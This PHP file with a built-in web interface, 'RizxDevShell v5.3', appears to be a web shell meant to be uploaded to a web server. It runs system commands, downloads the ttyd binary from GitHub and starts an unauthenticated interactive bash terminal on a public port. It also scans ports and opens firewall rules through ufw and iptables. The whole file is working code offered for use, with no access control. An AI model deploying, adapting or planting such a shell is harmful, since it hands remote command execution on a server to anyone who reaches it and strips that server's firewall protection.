<?php
// ================================================================
// RIZXDEVSHELL v5.3 - Port 80/443 Auto Switch + Scanner
// ================================================================
// Upload file ini ke web server, akses via browser.
// Centang "Gunakan Port 80/443" untuk auto switch ke port standar.
// ================================================================

ini_set('display_errors', 1);
error_reporting(E_ALL);

function _shell() {
    $disabled = explode(',', ini_get('disable_functions'));
    foreach (['shell_exec', 'exec', 'system'] as $f) {
        if (function_exists($f) && !in_array($f, $disabled)) return $f;
    }
    return false;
}
$SHELL = _shell();
if (!$SHELL) die('❌ shell_exec/exec/system tidak aktif. Hubungi admin hosting.');

function debug_log($msg) {
    file_put_contents(__DIR__ . '/rizx_debug.log', date('Y-m-d H:i:s') . ' | ' . $msg . "\n", FILE_APPEND);
}

// ---------- KONFIG ----------
$PORT_START = 8080;
$SCAN_PORTS = [1337, 1233, 3000, 5000, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9000, 6969];
$TTYD_BIN = __DIR__ . '/ttyd';
$LOG_TTYD = '/tmp/ttyd.log';
$STATUS_FILE = __DIR__ . '/rizx_status.json';
$LOCK_FILE = __DIR__ . '/rizx.lock';
// ---------------------------

// ---------- FUNGSI ----------
function getPublicIP() {
    foreach (['https://api.ipify.org', 'https://ifconfig.me/ip', 'https://icanhazip.com'] as $url) {
        $ip = trim(@file_get_contents($url));
        if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
    }
    return $_SERVER['SERVER_ADDR'] ?? '127.0.0.1';
}

function getDomain() {
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
    if ($host && $host !== 'localhost' && $host !== '127.0.0.1') {
        return $host;
    }
    return null;
}

function isPortAvailable($port) {
    $fp = @fsockopen('localhost', $port, $e, $s, 1);
    if ($fp) { fclose($fp); return false; }
    return true;
}

function checkExternalPort($ip, $port) {
    $url = "https://portchecker.co/api/check/{$ip}/{$port}";
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $response = @file_get_contents($url, false, $ctx);
    if ($response === false) return ['status' => 'unknown', 'message' => 'Gagal cek eksternal'];
    $data = json_decode($response, true);
    if (isset($data['status'])) {
        return ['status' => $data['status'], 'message' => $data['status'] === 'open' ? 'Terbuka' : 'Tertutup'];
    }
    return ['status' => 'unknown', 'message' => 'Respon tidak valid'];
}

function scanPorts($ports) {
    $results = [];
    $ip = getPublicIP();
    foreach ($ports as $p) {
        $internal = isPortAvailable($p) ? 'available' : 'used';
        $external = null;
        if ($internal === 'available') {
            $ext = checkExternalPort($ip, $p);
            $external = $ext['status'];
        }
        $results[] = [
            'port' => $p,
            'internal' => $internal,
            'external' => $external ?: 'unknown'
        ];
    }
    return $results;
}

function checkFirewall() {
    global $SHELL;
    $info = ['ufw' => false, 'iptables' => false, 'status' => 'unknown'];
    $ufw_check = $SHELL("ufw status 2>/dev/null | grep -i 'Status'");
    if ($ufw_check && strpos($ufw_check, 'active') !== false) {
        $info['ufw'] = true;
        $info['status'] = 'ufw_active';
        $info['rules'] = $SHELL("ufw status numbered 2>/dev/null | grep -E '^\\[[0-9]+\\]' | head -5");
    } else {
        $iptables_check = $SHELL("iptables -L INPUT -n 2>/dev/null | grep -E 'ACCEPT|DROP' | head -3");
        if ($iptables_check) {
            $info['iptables'] = true;
            $info['status'] = 'iptables_active';
            $info['rules'] = $iptables_check;
        }
    }
    return $info;
}

function openPort($port) {
    global $SHELL;
    $ufw = $SHELL("ufw allow {$port}/tcp 2>&1");
    if (strpos($ufw, 'Rule added') !== false || strpos($ufw, 'Skipping') !== false) {
        return ['success' => true, 'method' => 'ufw', 'message' => "Port $port dibuka via UFW"];
    }
    $iptables = $SHELL("iptables -I INPUT -p tcp --dport {$port} -j ACCEPT 2>&1");
    if (strpos($iptables, 'Bad') === false) {
        $SHELL("iptables-save > /etc/iptables/rules.v4 2>/dev/null");
        return ['success' => true, 'method' => 'iptables', 'message' => "Port $port dibuka via iptables"];
    }
    return ['success' => false, 'message' => "Gagal buka port $port. Coba manual: ufw allow $port/tcp"];
}

function findAvailablePort($start, $useStandard = false) {
    // Kalau pake standard port (80/443)
    if ($useStandard) {
        // Coba port 80 dulu
        if (isPortAvailable(80)) return 80;
        // Kalau 80 gak available, coba 443
        if (isPortAvailable(443)) return 443;
        // Kalau 80 & 443 gak available, fallback ke port start
    }
    for ($p = $start; $p < $start + 100; $p++) {
        if (isPortAvailable($p)) return $p;
    }
    return false;
}

function downloadBinary($url, $dest) {
    global $SHELL;
    if (file_exists($dest) && filesize($dest) > 10000) return true;
    $content = @file_get_contents($url);
    if ($content !== false) {
        file_put_contents($dest, $content);
        chmod($dest, 0755);
        return true;
    }
    $cmd = "curl -L -o " . escapeshellarg($dest) . " " . escapeshellarg($url) . " 2>/dev/null";
    $SHELL($cmd);
    return (file_exists($dest) && filesize($dest) > 10000);
}

function isProcessRunning($name) {
    global $SHELL;
    $out = $SHELL("pgrep -f '" . addslashes($name) . "'");
    return !empty(trim($out));
}

function getPid($name) {
    global $SHELL;
    $out = $SHELL("pgrep -f '" . addslashes($name) . "'");
    return trim($out);
}

function getStatus() {
    global $STATUS_FILE, $TTYD_BIN;
    $default = [
        'running' => false,
        'port' => null,
        'ttyd_pid' => null,
        'url' => null,
        'ip' => getPublicIP(),
        'domain' => getDomain(),
        'message' => 'Berhenti'
    ];
    if (!file_exists($STATUS_FILE)) return $default;
    $data = json_decode(file_get_contents($STATUS_FILE), true);
    if (!$data) return $default;
    $running = isProcessRunning($TTYD_BIN);
    if (!$running) {
        $default['running'] = false;
        $default['message'] = 'Proses mati';
        file_put_contents($STATUS_FILE, json_encode($default));
        return $default;
    }
    $data['running'] = true;
    $data['ttyd_pid'] = getPid($TTYD_BIN);
    $data['ip'] = getPublicIP();
    $data['domain'] = getDomain();
    $data['message'] = 'Aktif';
    $host = $data['domain'] ?: $data['ip'];
    $data['url'] = "http://{$host}:{$data['port']}";
    file_put_contents($STATUS_FILE, json_encode($data));
    return $data;
}

function startServices($useStandard = false) {
    global $PORT_START, $TTYD_BIN, $LOG_TTYD, $STATUS_FILE, $SHELL, $LOCK_FILE;
    if (file_exists($LOCK_FILE)) {
        $pid = file_get_contents($LOCK_FILE);
        if (isProcessRunning($pid)) {
            return ['success' => false, 'message' => 'Proses sedang berjalan (PID ' . $pid . ')'];
        } else {
            @unlink($LOCK_FILE);
        }
    }
    $SHELL("pkill -f '" . addslashes($TTYD_BIN) . "'");
    sleep(1);
    @unlink($LOCK_FILE);
    @unlink($STATUS_FILE);
    debug_log("Starting services... (useStandard: " . ($useStandard ? 'yes' : 'no') . ")");
    $port = findAvailablePort($PORT_START, $useStandard);
    if (!$port) {
        debug_log("No available port");
        return ['success' => false, 'message' => 'Tidak ada port kosong (8080-8180)'];
    }
    debug_log("Port: $port");
    $arch = php_uname('m');
    if ($arch == 'x86_64' || $arch == 'amd64') {
        $ttyd_url = 'https://github.com/tsl0922/ttyd/releases/download/1.7.4/ttyd.x86_64';
    } elseif ($arch == 'aarch64' || $arch == 'arm64') {
        $ttyd_url = 'https://github.com/tsl0922/ttyd/releases/download/1.7.4/ttyd.armhf';
    } else {
        return ['success' => false, 'message' => 'Arsitektur tidak didukung: ' . $arch];
    }
    if (!downloadBinary($ttyd_url, $TTYD_BIN)) return ['success' => false, 'message' => 'Gagal download ttyd'];
    debug_log("Binary ready");
    $cmd_ttyd = "nohup " . escapeshellarg($TTYD_BIN) . " -p $port -W bash > " . escapeshellarg($LOG_TTYD) . " 2>&1 &";
    $SHELL($cmd_ttyd);
    sleep(2);
    if (!isProcessRunning($TTYD_BIN)) {
        debug_log("ttyd failed to start");
        return ['success' => false, 'message' => 'Gagal jalankan ttyd. Cek log: ' . $LOG_TTYD];
    }
    debug_log("ttyd running (PID: " . getPid($TTYD_BIN) . ")");
    $ip = getPublicIP();
    $domain = getDomain();
    $host = $domain ?: $ip;
    $url = "http://{$host}:{$port}";
    $status = [
        'running' => true,
        'port' => $port,
        'ttyd_pid' => getPid($TTYD_BIN),
        'url' => $url,
        'ip' => $ip,
        'domain' => $domain,
        'message' => 'Aktif'
    ];
    file_put_contents($STATUS_FILE, json_encode($status));
    file_put_contents($LOCK_FILE, getPid($TTYD_BIN));
    debug_log("Status saved: " . json_encode($status));
    return ['success' => true, 'port' => $port, 'url' => $url, 'ip' => $ip, 'domain' => $domain];
}

function stopServices() {
    global $TTYD_BIN, $STATUS_FILE, $SHELL, $LOCK_FILE;
    $SHELL("pkill -f '" . addslashes($TTYD_BIN) . "'");
    @unlink($STATUS_FILE);
    @unlink($LOCK_FILE);
    return ['success' => true];
}

// ---------- AJAX ----------
$action = $_GET['action'] ?? '';
if ($action === 'status') {
    header('Content-Type: application/json');
    echo json_encode(getStatus());
    exit;
}
if ($action === 'start') {
    $useStandard = isset($_GET['standard']) && $_GET['standard'] === '1';
    header('Content-Type: application/json');
    echo json_encode(startServices($useStandard));
    exit;
}
if ($action === 'stop') {
    header('Content-Type: application/json');
    echo json_encode(stopServices());
    exit;
}
if ($action === 'scan_ports') {
    header('Content-Type: application/json');
    global $SCAN_PORTS;
    $results = scanPorts($SCAN_PORTS);
    $fw = checkFirewall();
    echo json_encode(['results' => $results, 'firewall' => $fw]);
    exit;
}
if ($action === 'open_port') {
    $port = isset($_GET['port']) ? intval($_GET['port']) : 0;
    if ($port < 1 || $port > 65535) {
        echo json_encode(['success' => false, 'message' => 'Port tidak valid']);
        exit;
    }
    echo json_encode(openPort($port));
    exit;
}

// ---------- UI ----------
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RizxDevShell v5.3</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: radial-gradient(ellipse at 30% 20%, #1e1a3a, #0b0e1a);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .glass {
            max-width: 1200px;
            width: 100%;
            background: rgba(255,255,255,0.03);
            backdrop-filter: blur(24px);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 40px;
            padding: 32px;
            box-shadow: 0 25px 50px -8px rgba(0,0,0,0.6);
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 24px;
            flex-wrap: wrap;
            gap: 12px;
        }
        .logo {
            font-size: 26px;
            font-weight: 700;
            background: linear-gradient(135deg, #a78bfa, #60a5fa);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .logo i { color: #a78bfa; margin-right: 10px; }
        .leds { display: flex; gap: 10px; align-items: center; }
        .led { width: 16px; height: 16px; border-radius: 50%; transition: 0.3s; }
        .led-red { background: #ef4444; box-shadow: 0 0 8px rgba(239,68,68,0.5); }
        .led-yellow { background: #f59e0b; box-shadow: 0 0 8px rgba(245,158,11,0.5); }
        .led-green { background: #34d399; box-shadow: 0 0 8px rgba(52,211,153,0.5); }
        .led-off { background: #374151; box-shadow: none; }
        .status-label { color: #94a3b8; font-size: 13px; margin-left: 6px; }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 12px;
            background: rgba(0,0,0,0.3);
            border-radius: 24px;
            padding: 16px 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.04);
        }
        .info-item .label { font-size: 11px; text-transform: uppercase; color: #64748b; }
        .info-item .value { font-weight: 600; font-size: 15px; color: #e2e8f0; word-break: break-all; }
        .value.green { color: #34d399; }
        .value.red { color: #f87171; }
        .mono { font-family: 'Courier New', monospace; font-size: 13px; }

        .btn-group { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
        .btn {
            padding: 12px 28px;
            border: none;
            border-radius: 40px;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: white;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.06);
        }
        .btn:hover { transform: scale(1.02); filter: brightness(1.1); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .btn-start { background: linear-gradient(135deg, #6366f1, #8b5cf6); }
        .btn-stop { background: linear-gradient(135deg, #ef4444, #dc2626); }
        .btn-refresh { background: rgba(255,255,255,0.08); }
        .btn-open { background: linear-gradient(135deg, #f59e0b, #d97706); }
        .btn-scan { background: linear-gradient(135deg, #10b981, #059669); }
        .btn-firewall { background: linear-gradient(135deg, #f472b6, #ec4899); }

        .card-result {
            background: rgba(0,0,0,0.2);
            border-radius: 20px;
            padding: 16px 20px;
            margin: 16px 0;
            border: 1px solid rgba(255,255,255,0.04);
        }
        .port-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
            gap: 8px;
            margin-top: 10px;
        }
        .port-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 6px 12px;
            border-radius: 12px;
            font-family: monospace;
            font-size: 13px;
            font-weight: 600;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.05);
            cursor: default;
            transition: 0.2s;
        }
        .port-item .port-num { font-weight: 700; }
        .port-item .status-badge {
            font-size: 10px;
            padding: 2px 8px;
            border-radius: 20px;
            font-weight: 700;
        }
        .port-item.internal-available { border-color: rgba(52,211,153,0.3); background: rgba(52,211,153,0.05); }
        .port-item.internal-used { border-color: rgba(248,113,113,0.3); background: rgba(248,113,113,0.05); }
        .port-item.external-open { border-color: rgba(52,211,153,0.5); background: rgba(52,211,153,0.08); }
        .port-item.external-closed { border-color: rgba(248,113,113,0.5); background: rgba(248,113,113,0.08); }
        .port-item.external-unknown { border-color: rgba(245,158,11,0.3); background: rgba(245,158,11,0.05); }

        .badge-available { background: rgba(52,211,153,0.2); color: #34d399; }
        .badge-used { background: rgba(248,113,113,0.2); color: #f87171; }
        .badge-open { background: rgba(52,211,153,0.3); color: #34d399; }
        .badge-closed { background: rgba(248,113,113,0.3); color: #f87171; }
        .badge-unknown { background: rgba(245,158,11,0.3); color: #fbbf24; }

        .fw-info {
            margin-top: 12px;
            padding: 12px 16px;
            border-radius: 16px;
            background: rgba(0,0,0,0.2);
            border-left: 4px solid #f472b6;
        }
        .fw-info .fw-title { color: #cbd5e1; font-weight: 600; }
        .fw-info .fw-detail { color: #94a3b8; font-size: 13px; white-space: pre-wrap; }

        .terminal-card {
            background: #0a0e17;
            border-radius: 24px;
            border: 1px solid rgba(255,255,255,0.04);
            overflow: hidden;
        }
        .terminal-header {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px 18px;
            background: rgba(255,255,255,0.02);
            border-bottom: 1px solid rgba(255,255,255,0.03);
        }
        .dot { width: 14px; height: 14px; border-radius: 50%; display: inline-block; }
        .dot-red { background: #ff5f56; }
        .dot-yellow { background: #ffbd2e; }
        .dot-green { background: #27c93f; }
        .terminal-title { color: #94a3b8; font-size: 13px; margin-left: 10px; }
        .terminal-body { height: 420px; width: 100%; background: #0a0e17; }
        .terminal-body iframe { width: 100%; height: 100%; border: none; }
        .placeholder {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #475569;
            flex-direction: column;
            gap: 12px;
        }
        .placeholder i { font-size: 48px; color: #334155; }
        .log-links { display: flex; gap: 20px; margin-top: 16px; flex-wrap: wrap; }
        .log-links a { color: #64748b; font-size: 13px; text-decoration: none; }
        .log-links a:hover { color: #94a3b8; text-decoration: underline; }

        .debug-box {
            background: rgba(0,0,0,0.4);
            border-radius: 12px;
            padding: 10px 14px;
            margin-bottom: 16px;
            font-family: monospace;
            font-size: 12px;
            color: #94a3b8;
            max-height: 120px;
            overflow-y: auto;
            white-space: pre-wrap;
            border: 1px solid rgba(255,255,255,0.03);
        }
        .warning-box {
            background: rgba(245,158,11,0.08);
            border-left: 4px solid #f59e0b;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 12px;
            color: #fbbf24;
            font-size: 14px;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(0,0,0,0.2);
            padding: 8px 16px;
            border-radius: 40px;
            border: 1px solid rgba(255,255,255,0.05);
            cursor: pointer;
            transition: 0.3s;
        }
        .checkbox-container:hover { background: rgba(255,255,255,0.05); }
        .checkbox-container input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #6366f1;
            cursor: pointer;
        }
        .checkbox-container label {
            color: #cbd5e1;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
        }
        .checkbox-container .badge-port {
            background: rgba(99,102,241,0.2);
            color: #a5b4fc;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }
        @media (max-width: 700px) {
            .glass { padding: 20px; }
            .info-grid { grid-template-columns: 1fr 1fr; }
            .terminal-body { height: 300px; }
            .port-grid { grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); }
        }
    </style>
</head>
<body>
<div class="glass">
    <div class="header">
        <div class="logo"><i class="fas fa-terminal"></i>RizxDevShell <span style="font-size:14px;color:#475569;font-weight:400;">v5.3</span></div>
        <div class="leds">
            <span class="led led-red" id="ledRed"></span>
            <span class="led led-yellow" id="ledYellow"></span>
            <span class="led led-green" id="ledGreen"></span>
            <span class="status-label" id="statusLabel">Berhenti</span>
        </div>
    </div>

    <div class="debug-box" id="debugBox">⏳ Menunggu status...</div>

    <!-- WARNING: FIREWALL PROVIDER -->
    <div class="warning-box" id="warningBox" style="display:none;">
        <i class="fas fa-exclamation-triangle"></i> <strong>Port mungkin diblokir oleh firewall provider!</strong> 
        Jika port tidak bisa diakses dari luar, buka port di panel kontrol VPS.
    </div>

    <div class="info-grid" id="infoGrid">
        <div class="info-item"><div class="label">IP Server</div><div class="value mono" id="ipValue">-</div></div>
        <div class="info-item"><div class="label">Domain</div><div class="value mono" id="domainValue">-</div></div>
        <div class="info-item"><div class="label">Port</div><div class="value mono" id="portValue">-</div></div>
        <div class="info-item"><div class="label">URL Akses</div><div class="value" id="urlStatus">❌ Tidak aktif</div></div>
        <div class="info-item"><div class="label">PID (ttyd)</div><div class="value mono" id="pidValue">-</div></div>
    </div>

    <!-- SCAN + FIREWALL SECTION -->
    <div class="card-result" id="scanResult">
        <div style="display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:8px;">
            <span style="font-weight:600; color:#e2e8f0;"><i class="fas fa-search"></i> Scan Port (Internal / External)</span>
            <div style="display:flex; gap:8px; flex-wrap:wrap;">
                <button class="btn btn-firewall" id="btnFirewall"><i class="fas fa-shield-alt"></i> Cek Firewall</button>
                <button class="btn btn-scan" id="btnScan"><i class="fas fa-sync-alt"></i> Scan Now</button>
            </div>
        </div>
        
        <!-- CHECKBOX PORT 80/443 -->
        <div style="display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:12px; margin:12px 0 8px 0;">
            <div class="checkbox-container" onclick="document.getElementById('chkStandard').click()">
                <input type="checkbox" id="chkStandard">
                <label for="chkStandard"><i class="fas fa-globe"></i> Gunakan Port Standar Web</label>
                <span class="badge-port">80 / 443</span>
            </div>
            <span style="font-size:12px; color:#64748b;" id="portStatusLabel">Otomatis cek port 80 ➜ 443 ➜ fallback</span>
        </div>

        <div class="port-grid" id="portGrid">
            <span style="color:#64748b; font-size:13px;">Klik Scan untuk melihat port tersedia.</span>
        </div>
        <div class="fw-info" id="fwInfo" style="display:none;">
            <div class="fw-title"><i class="fas fa-shield-alt"></i> Firewall Status</div>
            <div class="fw-detail" id="fwDetail">Loading...</div>
        </div>
    </div>

    <div class="btn-group">
        <button class="btn btn-start" id="btnStart"><i class="fas fa-play"></i> Start</button>
        <button class="btn btn-stop" id="btnStop" disabled><i class="fas fa-stop"></i> Stop</button>
        <button class="btn btn-refresh" id="btnRefresh"><i class="fas fa-sync-alt"></i> Refresh</button>
        <a class="btn btn-open" id="btnOpen" target="_blank" style="display:none;"><i class="fas fa-external-link-alt"></i> Buka Terminal</a>
    </div>

    <div class="terminal-card">
        <div class="terminal-header">
            <span class="dot dot-red"></span>
            <span class="dot dot-yellow"></span>
            <span class="dot dot-green"></span>
            <span class="terminal-title"><i class="fas fa-terminal"></i> Terminal Interaktif</span>
        </div>
        <div class="terminal-body" id="terminalBody">
            <div class="placeholder" id="placeholder">
                <i class="fas fa-power-off"></i>
                <span>Terminal belum aktif. Klik <strong>Start</strong>.</span>
            </div>
            <iframe id="terminalFrame" style="display:none;" allow="clipboard-read; clipboard-write;"></iframe>
        </div>
    </div>

    <div class="log-links">
        <a href="/tmp/ttyd.log" target="_blank"><i class="fas fa-file-alt"></i> Log ttyd</a>
        <a href="rizx_debug.log" target="_blank"><i class="fas fa-bug"></i> Debug Log</a>
    </div>
</div>

<script>
const API = window.location.pathname + '?action=';
let pollInterval = null;

const btnStart = document.getElementById('btnStart');
const btnStop = document.getElementById('btnStop');
const btnRefresh = document.getElementById('btnRefresh');
const btnOpen = document.getElementById('btnOpen');
const btnScan = document.getElementById('btnScan');
const btnFirewall = document.getElementById('btnFirewall');
const chkStandard = document.getElementById('chkStandard');
const terminalFrame = document.getElementById('terminalFrame');
const placeholder = document.getElementById('placeholder');
const statusLabel = document.getElementById('statusLabel');
const ledRed = document.getElementById('ledRed');
const ledYellow = document.getElementById('ledYellow');
const ledGreen = document.getElementById('ledGreen');
const ipValue = document.getElementById('ipValue');
const domainValue = document.getElementById('domainValue');
const portValue = document.getElementById('portValue');
const urlStatus = document.getElementById('urlStatus');
const pidValue = document.getElementById('pidValue');
const debugBox = document.getElementById('debugBox');
const portGrid = document.getElementById('portGrid');
const fwInfo = document.getElementById('fwInfo');
const fwDetail = document.getElementById('fwDetail');
const warningBox = document.getElementById('warningBox');
const portStatusLabel = document.getElementById('portStatusLabel');

// Update status label saat checkbox berubah
chkStandard.addEventListener('change', function() {
    if (this.checked) {
        portStatusLabel.textContent = '🟢 Mode: Coba port 80 ➜ 443 ➜ fallback';
    } else {
        portStatusLabel.textContent = '🔵 Mode: Scan dari port 8080 ke atas';
    }
});

function setLeds(state) {
    ledRed.className = 'led';
    ledYellow.className = 'led';
    ledGreen.className = 'led';
    if (state === 'stopped') {
        ledRed.classList.add('led-red');
        ledYellow.classList.add('led-off');
        ledGreen.classList.add('led-off');
        statusLabel.textContent = 'Berhenti';
        statusLabel.style.color = '#94a3b8';
    } else if (state === 'starting') {
        ledRed.classList.add('led-off');
        ledYellow.classList.add('led-yellow');
        ledGreen.classList.add('led-off');
        statusLabel.textContent = 'Memulai...';
        statusLabel.style.color = '#f59e0b';
    } else if (state === 'running') {
        ledRed.classList.add('led-off');
        ledYellow.classList.add('led-off');
        ledGreen.classList.add('led-green');
        statusLabel.textContent = 'Aktif';
        statusLabel.style.color = '#34d399';
    }
}

function updateUI(data) {
    ipValue.textContent = data.ip || '-';
    domainValue.textContent = data.domain || '-';
    portValue.textContent = data.port || '-';
    pidValue.textContent = data.ttyd_pid || '-';

    if (data.running && data.url) {
        setLeds('running');
        btnStart.disabled = true;
        btnStop.disabled = false;
        btnOpen.style.display = 'inline-flex';
        btnOpen.href = data.url;
        urlStatus.innerHTML = `<span class="green">✅ <a href="${data.url}" target="_blank">${data.url}</a></span>`;
        terminalFrame.src = data.url;
        terminalFrame.style.display = 'block';
        placeholder.style.display = 'none';
    } else {
        setLeds('stopped');
        btnStart.disabled = false;
        btnStop.disabled = true;
        btnOpen.style.display = 'none';
        urlStatus.innerHTML = '<span class="red">❌ Tidak aktif</span>';
        terminalFrame.style.display = 'none';
        placeholder.style.display = 'flex';
        placeholder.innerHTML = `<i class="fas fa-power-off"></i><span>Terminal belum aktif. Klik <strong>Start</strong>.</span>`;
    }
}

async function fetchStatus() {
    try {
        const r = await fetch(API + 'status');
        const d = await r.json();
        updateUI(d);
    } catch(e) { console.warn('Status fetch error:', e); }
}

async function fetchDebug() {
    try {
        const r = await fetch('rizx_debug.log?t=' + Date.now());
        const t = await r.text();
        debugBox.textContent = t || 'Tidak ada log.';
    } catch(e) {
        debugBox.textContent = 'Gagal load debug log.';
    }
}

async function scanPorts() {
    btnScan.disabled = true;
    btnScan.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...';
    try {
        const r = await fetch(API + 'scan_ports');
        const data = await r.json();
        if (data.results) {
            let html = '';
            let anyClosed = false;
            data.results.forEach(item => {
                const internalClass = item.internal === 'available' ? 'internal-available' : 'internal-used';
                const internalLabel = item.internal === 'available' ? '🟢' : '🔴';
                let externalClass = 'external-unknown';
                let externalLabel = '❓';
                if (item.external === 'open') {
                    externalClass = 'external-open';
                    externalLabel = '🌐 Terbuka';
                } else if (item.external === 'closed') {
                    externalClass = 'external-closed';
                    externalLabel = '🚫 Tertutup';
                    anyClosed = true;
                } else {
                    externalLabel = '❓ Unknown';
                }
                html += `
                    <div class="port-item ${internalClass} ${externalClass}">
                        <span class="port-num">${item.port}</span>
                        <span class="status-badge">${internalLabel} ${externalLabel}</span>
                    </div>
                `;
            });
            portGrid.innerHTML = html;
            if (anyClosed) {
                warningBox.style.display = 'block';
            } else {
                warningBox.style.display = 'none';
            }
        } else {
            portGrid.innerHTML = '<span style="color:#f87171;">Gagal scan port.</span>';
        }
        if (data.firewall) {
            fwInfo.style.display = 'block';
            let fwText = '';
            if (data.firewall.status === 'ufw_active') {
                fwText = `🛡️ UFW aktif\n${data.firewall.rules || 'Tidak ada rules khusus.'}`;
            } else if (data.firewall.status === 'iptables_active') {
                fwText = `🛡️ iptables aktif (aturan INPUT):\n${data.firewall.rules || 'Tidak ada rules.'}`;
            } else {
                fwText = '⚠️ Firewall lokal tidak aktif. Port mungkin terbuka.';
            }
            fwDetail.textContent = fwText;
        }
    } catch(e) {
        portGrid.innerHTML = '<span style="color:#f87171;">Error: ' + e.message + '</span>';
    }
    btnScan.disabled = false;
    btnScan.innerHTML = '<i class="fas fa-sync-alt"></i> Scan Now';
}

async function checkFirewall() {
    btnFirewall.disabled = true;
    btnFirewall.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking...';
    try {
        const r = await fetch(API + 'scan_ports');
        const data = await r.json();
        if (data.firewall) {
            fwInfo.style.display = 'block';
            let fwText = '';
            if (data.firewall.status === 'ufw_active') {
                fwText = `🛡️ UFW aktif\n${data.firewall.rules || 'Tidak ada rules khusus.'}`;
            } else if (data.firewall.status === 'iptables_active') {
                fwText = `🛡️ iptables aktif (aturan INPUT):\n${data.firewall.rules || 'Tidak ada rules.'}`;
            } else {
                fwText = '⚠️ Firewall lokal tidak aktif. Port mungkin terbuka.';
            }
            fwDetail.textContent = fwText;
        } else {
            fwInfo.style.display = 'block';
            fwDetail.textContent = '⚠️ Gagal mendapatkan info firewall.';
        }
    } catch(e) {
        alert('Error: ' + e.message);
    }
    btnFirewall.disabled = false;
    btnFirewall.innerHTML = '<i class="fas fa-shield-alt"></i> Cek Firewall';
}

async function doAction(action) {
    setLeds('starting');
    btnStart.disabled = true;
    btnStop.disabled = true;
    try {
        const standard = chkStandard.checked ? '1' : '0';
        const r = await fetch(API + action + '&standard=' + standard);
        const d = await r.json();
        if (d.success) {
            if (pollInterval) clearInterval(pollInterval);
            await fetchStatus();
            pollInterval = setInterval(fetchStatus, 3000);
            setTimeout(fetchDebug, 2000);
        } else {
            alert('❌ ' + (d.message || 'Gagal'));
            setLeds('stopped');
            btnStart.disabled = false;
            btnStop.disabled = true;
        }
    } catch(e) {
        alert('Error: ' + e.message);
        setLeds('stopped');
        btnStart.disabled = false;
        btnStop.disabled = true;
    }
}

btnStart.addEventListener('click', () => doAction('start'));
btnStop.addEventListener('click', () => doAction('stop'));
btnRefresh.addEventListener('click', () => { fetchStatus(); fetchDebug(); });
btnScan.addEventListener('click', scanPorts);
btnFirewall.addEventListener('click', checkFirewall);

fetchStatus();
fetchDebug();
pollInterval = setInterval(fetchStatus, 3000);
setInterval(fetchDebug, 5000);
setTimeout(scanPorts, 1500);
</script>
</body>
</html>